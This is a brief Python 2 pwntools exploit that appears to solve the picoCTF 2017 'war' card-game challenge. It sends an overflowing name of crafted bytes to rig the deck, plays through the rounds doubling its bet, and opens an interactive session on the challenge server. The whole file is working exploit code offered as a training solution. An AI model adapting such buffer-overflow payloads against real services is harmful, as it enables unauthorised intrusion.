from pwn import *
import sys

HOST = 'shell2017.picoctf.com'
PORT = 49182

def main(op):

  if op == 'p':
    r = process('./war')
  elif op == 'r':
    r = remote(HOST, PORT)
  else:
    print 'Must specify p for process or r for remote'
    sys.exit(0)
  r.recv(1024)
  r.sendline('\x04\x0e'*15 + 'A')

  for _ in range(52):
    print r.recv(1024)
    r.sendline('1')

  coins = 48
  while coins < 500:

    r.sendline(str(coins))
    r.recv(1024)
    coins *= 2

  r.interactive()

  r.close()

if __name__ == '__main__':
  if len(sys.argv) < 2:
    print 'Usage: python %s <p|r>' % (sys.argv[0])
    sys.exit(0)

  if sys.argv[1] != 'r' and sys.argv[1] != 'p':
    print 'Usage: python %s <p|r>' % (sys.argv[0])
    sys.exit(0)

  main(sys.argv[1])